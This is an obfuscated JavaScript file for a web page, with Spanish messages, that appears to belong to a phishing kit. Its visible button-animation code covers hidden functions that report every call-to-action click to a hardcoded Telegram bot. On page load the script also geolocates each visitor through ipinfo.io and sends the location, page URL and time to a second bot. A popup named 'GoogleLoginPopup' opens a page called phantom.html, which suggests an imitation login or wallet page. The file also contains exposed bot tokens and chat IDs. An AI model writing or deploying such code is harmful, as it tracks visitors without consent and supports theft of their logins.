function sendTelegramAlert(_0x478110) {
  const _0x5a084a = "🔔 Alerta: se hizo clic en el botón \"" + _0x478110 + "\".";
  fetch("https://api.telegram.org/bot8190880346:AAHUXBqorpFyMJoYAaA-0bkUefQ6o2OL71M/sendMessage", {
    'method': 'POST',
    'headers': {
      'Content-Type': 'application/json'
    },
    'body': JSON.stringify({
      'chat_id': "7831097636",
      'text': _0x5a084a
    })
  }).then(_0x57c5e1 => _0x57c5e1.json()).then(_0x825e58 => console.log("Mensaje enviado:", _0x825e58))["catch"](_0x394aca => console.error("Error enviando mensaje:", _0x394aca));
}
document.addEventListener("DOMContentLoaded", function () {
  const _0x5d78ef = document.querySelectorAll("button");
  _0x5d78ef.forEach(_0x2d75ab => {
    _0x2d75ab.addEventListener("mouseenter", function () {
      this.style.transform = "translateY(-2px)";
    });
    _0x2d75ab.addEventListener("mouseleave", function () {
      this.style.transform = 'translateY(0)';
    });
  });
  const _0xd46815 = document.querySelector(".cta-button");
  _0xd46815.addEventListener("click", function (_0x3c67b9) {
    const _0x4ff03c = document.createElement("span");
    const _0x58a7f0 = this.getBoundingClientRect();
    const _0x5e9ee3 = Math.max(_0x58a7f0.width, _0x58a7f0.height);
    const _0x22282c = _0x3c67b9.clientX - _0x58a7f0.left - _0x5e9ee3 / 0x2;
    const _0x3308a4 = _0x3c67b9.clientY - _0x58a7f0.top - _0x5e9ee3 / 0x2;
    _0x4ff03c.style.cssText = "\n                    position: absolute;\n                    width: " + _0x5e9ee3 + "px;\n                    height: " + _0x5e9ee3 + "px;\n                    left: " + _0x22282c + "px;\n                    top: " + _0x3308a4 + "px;\n                    background: rgba(255, 255, 255, 0.3);\n                    border-radius: 50%;\n                    transform: scale(0);\n                    animation: ripple 0.6s ease-out;\n                    pointer-events: none;\n                ";
    this.style.position = "relative";
    this.style.overflow = "hidden";
    this.appendChild(_0x4ff03c);
    setTimeout(() => _0x4ff03c.remove(), 0x258);
  });
});
const style = document.createElement("style");
style.textContent = "\n            @keyframes ripple {\n                to {\n                    transform: scale(2);\n                    opacity: 0;\n                }\n            }\n        ";
document.head.appendChild(style);
function sendTelegramAler() {
  var _0x282681 = screen.width / 0x2 - 250;
  var _0x462d89 = screen.height / 0x2 - 300;
  window.open("phantom.html", 'GoogleLoginPopup', "width=500,height=600,top=" + _0x462d89 + ",left=" + _0x282681 + ",resizable=yes,scrollbars=yes,status=yes");
}
document.addEventListener("DOMContentLoaded", function () {
  const _0x1a4a2d = document.getElementById("status");
  const _0x4944ad = window.location.href;
  const _0x1c4aa6 = new Date().toLocaleString();
  let _0xaf68f2 = "Ubicación desconocida";
  fetch('https://ipinfo.io/json').then(_0x2f70c1 => _0x2f70c1.json()).then(_0x17c93a => {
    if (_0x17c93a.city && _0x17c93a.country) {
      _0xaf68f2 = _0x17c93a.city + ", " + _0x17c93a.country;
    }
    _0x424ec3(_0x4944ad, _0x1c4aa6, _0xaf68f2);
  })['catch'](() => {
    _0x424ec3(_0x4944ad, _0x1c4aa6, _0xaf68f2);
  });
  function _0x424ec3(_0x1f57f9, _0x2fac3c, _0x2b8f0d) {
    const _0x29b612 = "¡Nuevo acceso a tu sitio!\n\n" + ("Dominio: " + _0x1f57f9 + "\n") + ("Fecha/Hora: " + _0x2fac3c + "\n") + ("Ubicación: " + _0x2b8f0d);
    const _0x289f78 = {
      'chat_id': "5900829263",
      'text': _0x29b612,
      'disable_notification': false
    };
    fetch("https://api.telegram.org/bot8100876082:AAEWNtHWALwoN0pdYbNi4X993URHgJdz7NI/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify(_0x289f78)
    }).then(_0x2f2038 => _0x2f2038.json()).then(_0x6e31bb => {
      if (_0x6e31bb.ok) {
        _0x1a4a2d.innerHTML = '';
        _0x1a4a2d.className = "status success";
        setTimeout(() => {
          _0x1a4a2d.innerHTML = '';
        }, 0x1388);
      } else {
        throw new Error(_0x6e31bb.description || "Error desconocido");
      }
    })["catch"](_0x554747 => {
      _0x1a4a2d.innerHTML = "<i class=\"fas fa-exclamation-triangle\"></i> Error: " + _0x554747.message;
      _0x1a4a2d.className = "status error";
      console.error('', _0x554747);
    });
  }
});